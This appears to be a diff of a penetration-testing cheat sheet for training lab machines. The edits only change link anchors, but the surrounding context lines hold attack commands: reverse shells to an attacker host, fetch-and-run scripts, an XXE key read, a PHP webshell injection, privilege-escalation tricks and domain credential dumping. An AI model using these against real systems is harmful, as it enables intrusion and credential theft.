@@ -30,7 +30,7 @@ showmount -e <IP>
 nc -nv <IP> 6697          # banner can leak a username
 ```
 
-**Seen on:** [Solidstate](/notes/oscp-labs/linux/) (Linux), [Sunday](/notes/oscp-labs/linux/) (Linux), [Chatterbox](/notes/oscp-labs/windows/) (Windows), [UnderPass](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Solidstate](/notes/oscp-labs/linux/#solidstate), [Sunday](/notes/oscp-labs/linux/#sunday), [Chatterbox](/notes/oscp-labs/windows/#chatterbox), [UnderPass](/notes/oscp-labs/linux/#underpass)
 
 **Notes:** [Information gathering](/notes/web-applications/information-gathering/) · **Pitfall:** trusting the top-1000 TCP scan — 4555, 22022, 61616 and UDP/161 were the whole foothold.
 
@@ -48,7 +48,7 @@ openssl s_client -connect <IP>:443        # SANs often list the vhosts
 curl -H 'Special-Dev: only4dev' http://dev.<DOMAIN>/   # .htaccess SetEnvIf gate
 ```
 
-**Seen on:** [Keeper](/notes/oscp-labs/linux/) (Linux), [Editor](/notes/oscp-labs/linux/) (Linux), [BoardLight](/notes/oscp-labs/linux/) (Linux), [Love](/notes/oscp-labs/windows/) (Windows)
+**Seen on:** [Keeper](/notes/oscp-labs/linux/#keeper), [Editor](/notes/oscp-labs/linux/#editor), [BoardLight](/notes/oscp-labs/linux/#boardlight), [Love](/notes/oscp-labs/windows/#love)
 
 **Notes:** [Fuzzing](/notes/web-applications/fuzzing/) · **Pitfall:** filtering on status codes only — wildcard 301s and empty 200s hide the real vhost; use `-ac` (and check 403-vs-404 for directories).
 
@@ -67,7 +67,7 @@ git -C src status && git -C src diff --cached
 tar xvf backup.tar
 ```
 
-**Seen on:** [Pilgrimage](/notes/oscp-labs/linux/) (Linux), [UpDown](/notes/oscp-labs/linux/) (Linux), [Linkvortex](/notes/oscp-labs/linux/) (Linux), [Dog](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Pilgrimage](/notes/oscp-labs/linux/#pilgrimage), [UpDown](/notes/oscp-labs/linux/#updown), [Linkvortex](/notes/oscp-labs/linux/#linkvortex), [Dog](/notes/oscp-labs/linux/#dog)
 
 **Notes:** [Information gathering](/notes/web-applications/information-gathering/) · **Pitfall:** expecting the wordlist to find it — `.git` at a vhost root, `/backup/*.tar` and a config backup are routinely missed.
 
@@ -86,7 +86,7 @@ curl -s http://<IP>/administrator/manifests/files/joomla.xml
 searchsploit <product>
 ```
 
-**Seen on:** [Pilgrimage](/notes/oscp-labs/linux/) (Linux), [Broker](/notes/oscp-labs/linux/) (Linux), [Arctic](/notes/oscp-labs/windows/) (Windows), [Devvortex](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Pilgrimage](/notes/oscp-labs/linux/#pilgrimage), [Broker](/notes/oscp-labs/linux/#broker), [Arctic](/notes/oscp-labs/windows/#arctic), [Devvortex](/notes/oscp-labs/linux/#devvortex)
 
 **Notes:** [Information gathering](/notes/web-applications/information-gathering/) · **Pitfall:** believing the advertised version — a plugin changelog can deliberately lie (Tartarsauce), and the vulnerable component may be a bundled binary.
 
@@ -108,7 +108,7 @@ sshpass -p '<PASS>' ssh <USER>@<IP> -t bash
 su - <USER>
 ```
 
-**Seen on:** [Nibbles](/notes/oscp-labs/linux/) (Linux), [Solidstate](/notes/oscp-labs/linux/) (Linux), [Sunday](/notes/oscp-labs/linux/) (Linux), [UnderPass](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Nibbles](/notes/oscp-labs/linux/#nibbles), [Solidstate](/notes/oscp-labs/linux/#solidstate), [Sunday](/notes/oscp-labs/linux/#sunday), [UnderPass](/notes/oscp-labs/linux/#underpass)
 
 **Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · **Pitfall:** hunting a new bug before spraying every recovered or guessed pair at every user and every service.
 
@@ -128,7 +128,7 @@ telnet <IP> 110        # POP3: USER / PASS / LIST / RETR 1
 wget -r ftp://anonymous:@<IP>
 ```
 
-**Seen on:** [Pandora](/notes/oscp-labs/linux/) (Linux), [Solidstate](/notes/oscp-labs/linux/) (Linux), [Enigma](/notes/oscp-labs/linux/) (Linux), [Netmon](/notes/oscp-labs/windows/) (Windows)
+**Seen on:** [Pandora](/notes/oscp-labs/linux/#pandora), [Solidstate](/notes/oscp-labs/linux/#solidstate), [Enigma](/notes/oscp-labs/linux/#enigma), [Netmon](/notes/oscp-labs/windows/#netmon)
 
 **Notes:** [SNMP](/notes/protocols-and-services/snmp/) · [POP3](/notes/protocols-and-services/pop3/) · [NFS](/notes/protocols-and-services/nfs/) · **Pitfall:** assuming `public` is the only community string — `internal` was the live one (Mentor).
 
@@ -148,7 +148,7 @@ hashcat -m 13100 kerberoast.txt rockyou.txt
 zip2john backup.zip > h && john h
 ```
 
-**Seen on:** [Sunday](/notes/oscp-labs/linux/) (Linux), [Codify](/notes/oscp-labs/linux/) (Linux), [Builder](/notes/oscp-labs/linux/) (Linux), [Active](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Sunday](/notes/oscp-labs/linux/#sunday), [Codify](/notes/oscp-labs/linux/#codify), [Builder](/notes/oscp-labs/linux/#builder), [Active](/notes/oscp-labs/ad/#active)
 
 **Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · **Pitfall:** letting hashcat autodetect bcrypt — four modes are offered and a `#jbcrypt:` prefix is parsed as a username; force `-m 3200 --user`.
 
@@ -167,7 +167,7 @@ netexec ssh <IP> -u users.txt -p passwords.txt --continue-on-success
 rpcclient -U '<USER>%<PASS>' <IP> -c 'lookupsids S-1-5-21-...-1012'
 ```
 
-**Seen on:** [EscapeTwo](/notes/oscp-labs/ad/) (AD), [Signed](/notes/oscp-labs/ad/) (AD), [Heist](/notes/oscp-labs/windows/) (Windows), [UnderPass](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [EscapeTwo](/notes/oscp-labs/ad/#escapetwo), [Signed](/notes/oscp-labs/ad/#signed), [Heist](/notes/oscp-labs/windows/#heist), [UnderPass](/notes/oscp-labs/linux/#underpass)
 
 **Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · **Pitfall:** stopping at the first success and forgetting `--local-auth` — the same list must be tested against both SQL and domain auth, and username case matters.
 
@@ -194,7 +194,7 @@ curl -u tomcat:'<PASS>' -T shell.war 'http://<IP>:8080/manager/text/deploy?path=
 msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f war > r.war && jar tf r.war
 ```
 
-**Seen on:** [Popcorn](/notes/oscp-labs/linux/) (Linux), [Magic](/notes/oscp-labs/linux/) (Linux), [Bounty](/notes/oscp-labs/windows/) (Windows), [Tabby](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Popcorn](/notes/oscp-labs/linux/#popcorn), [Magic](/notes/oscp-labs/linux/#magic), [Bounty](/notes/oscp-labs/windows/#bounty), [Tabby](/notes/oscp-labs/linux/#tabby)
 
 **Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Tomcat](/notes/web-applications/web-technologies/tomcat/) · [IIS](/notes/web-applications/web-technologies/microsoft-iis/) · **Pitfall:** assuming the upload is the shell — if the extension does not execute, the win is a config/handler file or a different writable directory.
 
@@ -218,7 +218,7 @@ curl -s -G 'http://<IP>/blog/' --data-urlencode 'lang=\windows\win.ini'
 curl 'http://<IP>/?page=phar://uploads/<md5>/rev.0xdf/rev'
 ```
 
-**Seen on:** [Poison](/notes/oscp-labs/linux/) (Linux), [Nineveh](/notes/oscp-labs/linux/) (Linux), [Sniper](/notes/oscp-labs/windows/) (Windows), [UpDown](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Poison](/notes/oscp-labs/linux/#poison), [Nineveh](/notes/oscp-labs/linux/#nineveh), [Sniper](/notes/oscp-labs/windows/#sniper), [UpDown](/notes/oscp-labs/linux/#updown)
 
 **Notes:** [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) · [RFI](/notes/web-applications/web-attacks/remote-file-inclusion-rfi/) · **Pitfall:** chasing RFI after reading `allow_url_include=Off` — read `phpinfo.php` first, then poison a file the app already includes.
 
@@ -241,7 +241,7 @@ cod=999 UNION ALL SELECT null,'<?php system($_REQUEST["cmd"]); ?>',null,null,nul
 sqlmap -r removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B
 ```
 
-**Seen on:** [Jarvis](/notes/oscp-labs/linux/) (Linux), [Magic](/notes/oscp-labs/linux/) (Linux), [Giddy](/notes/oscp-labs/windows/) (Windows), [Cctv](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Jarvis](/notes/oscp-labs/linux/#jarvis), [Magic](/notes/oscp-labs/linux/#magic), [Giddy](/notes/oscp-labs/windows/#giddy), [Cctv](/notes/oscp-labs/linux/#cctv)
 
 **Notes:** [SQL injection](/notes/web-applications/web-attacks/sql-injection/) · [MSSQL](/notes/protocols-and-services/mssql/) · **Pitfall:** running sqlmap at full speed into a rate-based WAF — throttle it (`--delay`, `--random-agent`) or work manually.
 
@@ -264,7 +264,7 @@ curl -s -d "xajax=window_submit&xajaxr=1&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%
 {"path":"/tmp;nc <ATTACKER> <LPORT> -e sh;"}
 ```
 
-**Seen on:** [Cozyhosting](/notes/oscp-labs/linux/) (Linux), [Precious](/notes/oscp-labs/linux/) (Linux), [OpenAdmin](/notes/oscp-labs/linux/) (Linux), [Mentor](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Cozyhosting](/notes/oscp-labs/linux/#cozyhosting), [Precious](/notes/oscp-labs/linux/#precious), [OpenAdmin](/notes/oscp-labs/linux/#openadmin), [Mentor](/notes/oscp-labs/linux/#mentor)
 
 **Notes:** [OS command injection](/notes/web-applications/web-attacks/os-command-injection/) · **Pitfall:** injecting into the field that is filtered — the other parameter (username vs host) is usually the injectable one.
 
@@ -286,7 +286,7 @@ curl -s -d "xajax=window_submit&xajaxr=1&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%
 curl -s -G 'http://wiki.<DOMAIN>/xwiki/bin/view/Main/SolrSearch' --data-urlencode 'media=rss' --data-urlencode 'text=}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}'
 ```
 
-**Seen on:** [Busqueda](/notes/oscp-labs/linux/) (Linux), [Gobox](/notes/oscp-labs/ad/) (Linux), [Editor](/notes/oscp-labs/linux/) (Linux), [Codify](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Busqueda](/notes/oscp-labs/linux/#busqueda), [Gobox](/notes/oscp-labs/ad/#gobox), [Editor](/notes/oscp-labs/linux/#editor), [Codify](/notes/oscp-labs/linux/#codify)
 
 **Notes:** [Web attacks](/notes/web-applications/web-attacks/) · **Pitfall:** copying a whole POC — vm2 harnesses carry their own loader; submit only the `code` variable (Codify).
 
@@ -308,7 +308,7 @@ nc -lvnp 389
 curl -s -X POST http://<IP>/process.php -H 'Content-Type: text/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY t SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">]><order><quantity>3</quantity><item>&t;</item><address>x</address></order>'
 ```
 
-**Seen on:** [Editorial](/notes/oscp-labs/linux/) (Linux), [Love](/notes/oscp-labs/windows/) (Windows), [Return](/notes/oscp-labs/ad/) (AD), [Markup](/notes/oscp-labs/windows/) (Windows)
+**Seen on:** [Editorial](/notes/oscp-labs/linux/#editorial), [Love](/notes/oscp-labs/windows/#love), [Return](/notes/oscp-labs/ad/#return), [Markup](/notes/oscp-labs/windows/#markup)
 
 **Notes:** [SSRF](/notes/web-applications/web-attacks/ssrf/) · [XXE](/notes/web-applications/web-attacks/xml-external-entities-xxe/) · **Pitfall:** assuming SSRF must reach cloud metadata, or sending the entity to a port/vhost that does not parse XML — internal APIs and outbound auth are the useful targets; on UpDown SSRF was a dead end.
 
@@ -330,7 +330,7 @@ sudo /bin/nano /opt/priv                               # ^R ^X then: reset; sh 1
 sudo /usr/bin/vi /var/www/html/x -c ':!/bin/sh'        # wildcard is a prefix check (Swagshop)
 ```
 
-**Seen on:** [Sunday](/notes/oscp-labs/linux/) (Linux), [Cozyhosting](/notes/oscp-labs/linux/) (Linux), [OpenAdmin](/notes/oscp-labs/linux/) (Linux), [Swagshop](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Sunday](/notes/oscp-labs/linux/#sunday), [Cozyhosting](/notes/oscp-labs/linux/#cozyhosting), [OpenAdmin](/notes/oscp-labs/linux/#openadmin), [Swagshop](/notes/oscp-labs/linux/#swagshop)
 
 **Notes:** [Jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · [Miscellaneous](/notes/linux-privilege-escalation/miscellaneous-techniques/) · **Pitfall:** reading only the binary name — an unquoted comparison accepting `*` (Codify) or a `./script.sh` resolved from your CWD (Busqueda) is the actual bug.
 
@@ -352,7 +352,7 @@ touch '/var/www/html/uploads/a; echo <BASE64> | base64 -d | sh; b'
 echo '<PAYLOAD> &' >> /etc/dahdi/init.conf && echo restart > /var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
-**Seen on:** [Nibbles](/notes/oscp-labs/linux/) (Linux), [Solidstate](/notes/oscp-labs/linux/) (Linux), [Bashed](/notes/oscp-labs/linux/) (Linux), [Networked](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Nibbles](/notes/oscp-labs/linux/#nibbles), [Solidstate](/notes/oscp-labs/linux/#solidstate), [Bashed](/notes/oscp-labs/linux/#bashed), [Networked](/notes/oscp-labs/linux/#networked)
 
 **Notes:** [Jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · **Pitfall:** overwriting a shared or self-overwriting script — append and re-check, and test your payload in the shell the job actually uses (`sh`, not bash).
 
@@ -373,7 +373,7 @@ export PATH=/dev/shm:$PATH && sysinfo
 printf 'cat /root/root.txt\n' > /tmp/listusers && /usr/bin/viewuser   # missing file run as root (Irked)
 ```
 
-**Seen on:** [Magic](/notes/oscp-labs/linux/) (Linux), [Pandora](/notes/oscp-labs/linux/) (Linux), [Irked](/notes/oscp-labs/linux/) (Linux), [Cctv](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Magic](/notes/oscp-labs/linux/#magic), [Pandora](/notes/oscp-labs/linux/#pandora), [Irked](/notes/oscp-labs/linux/#irked), [Cctv](/notes/oscp-labs/linux/#cctv)
 
 **Notes:** [Capabilities abuse](/notes/linux-privilege-escalation/capabilities-abuse/) · [Environment variables](/notes/linux-privilege-escalation/environment-variables-abuse/) · **Pitfall:** stopping at the SUID list — trace the binary to see which helper it calls and whether that helper comes from `PATH`.
 
@@ -394,7 +394,7 @@ lxc init alpine p -c security.privileged=true
 lxc config device add p host-root disk source=/ path=/mnt/root recursive=true
 ```
 
-**Seen on:** [Tabby](/notes/oscp-labs/linux/) (Linux), [Busqueda](/notes/oscp-labs/linux/) (Linux), [Silentium](/notes/oscp-labs/linux/) (Linux), [Mentor](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Tabby](/notes/oscp-labs/linux/#tabby), [Busqueda](/notes/oscp-labs/linux/#busqueda), [Silentium](/notes/oscp-labs/linux/#silentium), [Mentor](/notes/oscp-labs/linux/#mentor)
 
 **Notes:** [Privileged groups](/notes/linux-privilege-escalation/privileged-groups/) · **Pitfall:** staging a glibc tool (chisel) into an Alpine container — use what the image already has, such as `python` and `psycopg2`.
 
@@ -413,7 +413,7 @@ rm -rf ~/.cache; ln -s /etc/passwd ~/.cache; ssh localhost true    # PAM MOTD (P
 gcc -o a 44298.c && ./a                                            # kernel 4.4.0-116 (Help)
 ```
 
-**Seen on:** [Popcorn](/notes/oscp-labs/linux/) (Linux), [Help](/notes/oscp-labs/linux/) (Linux), [BoardLight](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Popcorn](/notes/oscp-labs/linux/#popcorn), [Help](/notes/oscp-labs/linux/#help), [BoardLight](/notes/oscp-labs/linux/#boardlight)
 
 **Notes:** [Miscellaneous](/notes/linux-privilege-escalation/miscellaneous-techniques/) · **Pitfall:** running an exploit that spawns a local root shell from a non-interactive webshell — choose one that calls back to you.
 
@@ -433,7 +433,7 @@ GodPotato.exe -cmd "nc64.exe -e cmd.exe <ATTACKER> <LPORT>"   # modern Windows (
 lp.exe * rev.bat                                              # Server 2008 R2 (Bounty)
 ```
 
-**Seen on:** [Bounty](/notes/oscp-labs/windows/) (Windows), [Mailing](/notes/oscp-labs/windows/) (Windows), [Querier](/notes/oscp-labs/windows/) (Windows), [Signed](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Bounty](/notes/oscp-labs/windows/#bounty), [Mailing](/notes/oscp-labs/windows/#mailing), [Querier](/notes/oscp-labs/windows/#querier), [Signed](/notes/oscp-labs/ad/#signed)
 
 **Notes:** [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · **Pitfall:** running JuicyPotato on Server 2019+ — it is dead there; use GodPotato/PrintSpoofer, and check for a filtered token first.
 
@@ -455,7 +455,7 @@ msiexec /quiet /qn /i rev.msi
 icacls root.txt /grant <USER>:F                      # inherited Full Control on the parent (Chatterbox)
 ```
 
-**Seen on:** [Markup](/notes/oscp-labs/windows/) (Windows), [Giddy](/notes/oscp-labs/windows/) (Windows), [Love](/notes/oscp-labs/windows/) (Windows), [Chatterbox](/notes/oscp-labs/windows/) (Windows)
+**Seen on:** [Markup](/notes/oscp-labs/windows/#markup), [Giddy](/notes/oscp-labs/windows/#giddy), [Love](/notes/oscp-labs/windows/#love), [Chatterbox](/notes/oscp-labs/windows/#chatterbox)
 
 **Notes:** [File system ACLs](/notes/windows-privilege-escalation/file-system-acls/) · [Unquoted service paths](/notes/windows-privilege-escalation/unquoted-service-paths/) · **Pitfall:** assuming the writable file is the exploit — Markup's `job.bat` is overwritten each run, so your line vanishes and looks like failure.
 
@@ -475,7 +475,7 @@ netstat -ano | findstr :0                    # localhost-only service (Buff)
 tasklist /v | findstr <PID>
 ```
 
-**Seen on:** [Arctic](/notes/oscp-labs/windows/) (Windows), [Buff](/notes/oscp-labs/windows/) (Windows), [Bounty](/notes/oscp-labs/windows/) (Windows)
+**Seen on:** [Arctic](/notes/oscp-labs/windows/#arctic), [Buff](/notes/oscp-labs/windows/#buff), [Bounty](/notes/oscp-labs/windows/#bounty)
 
 **Notes:** [Attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · **Pitfall:** launching a local-only exploit from a remote shell — a SYSTEM `cmd.exe` you cannot see is not a shell.
 
@@ -496,7 +496,7 @@ netexec smb <IP> -u guest -p '' --rid-brute | grep SidTypeUser
 netexec ldap <IP> -u <USER> -p '<PASS>' --users
 ```
 
-**Seen on:** [Forest](/notes/oscp-labs/ad/) (AD), [Sauna](/notes/oscp-labs/ad/) (AD), [Cicada](/notes/oscp-labs/ad/) (AD), [Monteverde](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Forest](/notes/oscp-labs/ad/#forest), [Sauna](/notes/oscp-labs/ad/#sauna), [Cicada](/notes/oscp-labs/ad/#cicada), [Monteverde](/notes/oscp-labs/ad/#monteverde)
 
 **Notes:** [Initial access](/notes/active-directory/initial-access/) · **Pitfall:** treating kerbrute's four case variants of one user as four users — lowercase and `sort -u` before spraying, or you inflate the list and any lockout counter.
 
@@ -517,7 +517,7 @@ targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p '<PASS>'
 sudo ntpdate <DOMAIN>            # targeted roast fails without sync
 ```
 
-**Seen on:** [Forest](/notes/oscp-labs/ad/) (AD), [Sauna](/notes/oscp-labs/ad/) (AD), [Active](/notes/oscp-labs/ad/) (AD), [Administrator](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Forest](/notes/oscp-labs/ad/#forest), [Sauna](/notes/oscp-labs/ad/#sauna), [Active](/notes/oscp-labs/ad/#active), [Administrator](/notes/oscp-labs/ad/#administrator)
 
 **Notes:** [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) · **Pitfall:** cracking a normal user when the SPN sits on a privileged account — a single roast of `Administrator` was the whole box (Active).
 
@@ -538,7 +538,7 @@ New-GPO -Name x; New-GPLink -Name x -Target "DC=<DOMAIN>,DC=local"
 gpupdate /force
 ```
 
-**Seen on:** [Forest](/notes/oscp-labs/ad/) (AD), [Blackfield](/notes/oscp-labs/ad/) (AD), [Certified](/notes/oscp-labs/ad/) (AD), [TheFrizz](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Forest](/notes/oscp-labs/ad/#forest), [Blackfield](/notes/oscp-labs/ad/#blackfield), [Certified](/notes/oscp-labs/ad/#certified), [TheFrizz](/notes/oscp-labs/ad/#thefrizz)
 
 **Notes:** [ACL abuse](/notes/active-directory/internal-enumeration-and-lateral-movement/) · [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) · **Pitfall:** granting the right but not verifying it immediately before the dump — Forest's `revert.ps1` strips ACLs every 60 seconds.
 
@@ -558,7 +558,7 @@ certipy template -u <USER> -hashes <HASH> -template <TEMPLATE> -save-old     # E
 certipy account update -user <USER> -upn Administrator                       # ESC9, UPN without @domain
 ```
 
-**Seen on:** [Escape](/notes/oscp-labs/ad/) (AD), [EscapeTwo](/notes/oscp-labs/ad/) (AD), [Certified](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Escape](/notes/oscp-labs/ad/#escape), [EscapeTwo](/notes/oscp-labs/ad/#escapetwo), [Certified](/notes/oscp-labs/ad/#certified)
 
 **Notes:** [ADCS attacks](/notes/active-directory/adcs-attacks/) · **Pitfall:** concluding "no vulnerable templates" after one `find` — ESC4 only appeared when run as `ca_svc`, a Cert Publishers member.
 
@@ -578,7 +578,7 @@ secretsdump.py -sam sam -system system LOCAL
 Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\<ATTACKER>\share\ntds.dit
 ```
 
-**Seen on:** [Return](/notes/oscp-labs/ad/) (AD), [Blackfield](/notes/oscp-labs/ad/) (AD), [Cicada](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Return](/notes/oscp-labs/ad/#return), [Blackfield](/notes/oscp-labs/ad/#blackfield), [Cicada](/notes/oscp-labs/ad/#cicada)
 
 **Notes:** [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) · [Excessive rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · **Pitfall:** `sc start` returns 1053 and the service manager kills your child after ~30 s — put the payload on the service's own command line.
 
@@ -598,7 +598,7 @@ curl -d 'ip=<ATTACKER>' http://<IP>/settings.php    # LDAP simple bind, cleartex
 nc -lvnp 389
 ```
 
-**Seen on:** [Querier](/notes/oscp-labs/windows/) (Windows), [Giddy](/notes/oscp-labs/windows/) (Windows), [Escape](/notes/oscp-labs/ad/) (AD), [Return](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Querier](/notes/oscp-labs/windows/#querier), [Giddy](/notes/oscp-labs/windows/#giddy), [Escape](/notes/oscp-labs/ad/#escape), [Return](/notes/oscp-labs/ad/#return)
 
 **Notes:** [NTLM relay](/notes/active-directory/ntlm-relay/) · [MSSQL](/notes/protocols-and-services/mssql/) · **Pitfall:** trying to relay when SMB signing is enforced — capture to crack, and an LDAP bind gives cleartext rather than a challenge.
 
@@ -620,7 +620,7 @@ KRB5CCNAME=x.ccache mssqlclient.py -no-pass -k <DC>.<DOMAIN>
 SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS C;
 ```
 
-**Seen on:** [Escape](/notes/oscp-labs/ad/) (AD), [EscapeTwo](/notes/oscp-labs/ad/) (AD), [Querier](/notes/oscp-labs/windows/) (Windows), [Signed](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Escape](/notes/oscp-labs/ad/#escape), [EscapeTwo](/notes/oscp-labs/ad/#escapetwo), [Querier](/notes/oscp-labs/windows/#querier), [Signed](/notes/oscp-labs/ad/#signed)
 
 **Notes:** [MSSQL](/notes/protocols-and-services/mssql/) · **Pitfall:** writing off an account after one failed login — `scott` is SQL-only and `mssqlsvc` is domain-only; test both backends.
 
@@ -642,7 +642,7 @@ chisel server -p 8000 --reverse                                  # attacker
 .\c.exe client <ATTACKER>:8000 R:8888:localhost:8888             # target
 ```
 
-**Seen on:** [Poison](/notes/oscp-labs/linux/) (Linux), [Editor](/notes/oscp-labs/linux/) (Linux), [Enigma](/notes/oscp-labs/linux/) (Linux), [Buff](/notes/oscp-labs/windows/) (Windows)
+**Seen on:** [Poison](/notes/oscp-labs/linux/#poison), [Editor](/notes/oscp-labs/linux/#editor), [Enigma](/notes/oscp-labs/linux/#enigma), [Buff](/notes/oscp-labs/windows/#buff)
 
 **Notes:** [Pivoting](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) · **Pitfall:** trying to reach a loopback vhost through the external IP — tunnel first, then point the hostname at 127.0.0.1 in `/etc/hosts`.
 
@@ -661,7 +661,7 @@ curl http://<ATTACKER>/rev.sh -o /tmp/rev.sh && bash /tmp/rev.sh   # avoid pipe 
 copy nc64.exe C:\Windows\System32\spool\drivers\color\             # AppLocker-allowed path (Sniper)
 ```
 
-**Seen on:** [Buff](/notes/oscp-labs/windows/) (Windows), [Sniper](/notes/oscp-labs/windows/) (Windows), [Giddy](/notes/oscp-labs/windows/) (Windows), [Flight](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Buff](/notes/oscp-labs/windows/#buff), [Sniper](/notes/oscp-labs/windows/#sniper), [Giddy](/notes/oscp-labs/windows/#giddy), [Flight](/notes/oscp-labs/ad/#flight)
 
 **Notes:** [File transfers](/notes/utilities-scripts-and-payloads/file-transfers/) · [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) · **Pitfall:** assuming a PowerShell one-liner or pipe survives — stage a file and execute it from a directory the policy allows.
 
@@ -682,7 +682,7 @@ Get-ChildItem 'C:\$RECYCLE.BIN' -Recurse -Force      # $R = content (TheFrizz)
 Get-ADComputer <DC> -property 'ms-mcs-admpwd'        # LAPS (Timelapse)
 ```
 
-**Seen on:** [Jeeves](/notes/oscp-labs/windows/) (Windows), [Access](/notes/oscp-labs/windows/) (Windows), [TheFrizz](/notes/oscp-labs/ad/) (AD), [Timelapse](/notes/oscp-labs/ad/) (AD)
+**Seen on:** [Jeeves](/notes/oscp-labs/windows/#jeeves), [Access](/notes/oscp-labs/windows/#access), [TheFrizz](/notes/oscp-labs/ad/#thefrizz), [Timelapse](/notes/oscp-labs/ad/#timelapse)
 
 **Notes:** [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) · **Pitfall:** stopping at `ls` — `-Force`, `dir /R`, the Recycle Bin, browser memory and DPAPI blobs hold the credential that ends the box.
 
@@ -702,7 +702,7 @@ schtasks /query /tn restore /v        # a revert loop explains vanishing ACLs (F
 cat readme.txt         # changelog can contradict the scanner's version (Tartarsauce)
 ```
 
-**Seen on:** [Tartarsauce](/notes/oscp-labs/linux/) (Linux), [Bashed](/notes/oscp-labs/linux/) (Linux), [Forest](/notes/oscp-labs/ad/) (AD), [Broker](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Tartarsauce](/notes/oscp-labs/linux/#tartarsauce), [Bashed](/notes/oscp-labs/linux/#bashed), [Forest](/notes/oscp-labs/ad/#forest), [Broker](/notes/oscp-labs/linux/#broker)
 
 **Notes:** [Attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) · **Pitfall:** sinking time into an app you can log into but cannot write to (Monstra on Tartarsauce) or an admin UI that is a dead end (Broker's 8161/80).
 
@@ -722,7 +722,7 @@ curl http://<ATTACKER>/rev.sh -o /tmp/rev.sh && bash /tmp/rev.sh   # pipes becom
 username=x;ping${IFS}-c${IFS}1${IFS}<IP>;#                          # spaces in a filtered field
 ```
 
-**Seen on:** [Silentium](/notes/oscp-labs/linux/) (Linux), [Editorial](/notes/oscp-labs/linux/) (Linux), [Monitored](/notes/oscp-labs/linux/) (Linux), [Cozyhosting](/notes/oscp-labs/linux/) (Linux)
+**Seen on:** [Silentium](/notes/oscp-labs/linux/#silentium), [Editorial](/notes/oscp-labs/linux/#editorial), [Monitored](/notes/oscp-labs/linux/#monitored), [Cozyhosting](/notes/oscp-labs/linux/#cozyhosting)
 
 **Notes:** [Shells and payloads](/notes/utilities-scripts-and-payloads/shells-and-payloads/) · **Pitfall:** trusting the response body or a copied one-liner — a clone that throws after cloning, a write that answers "Something went wrong", and a `getprofile.sh` that reports `mv: cannot stat` all executed; re-encode and test in the target's own shell.
 
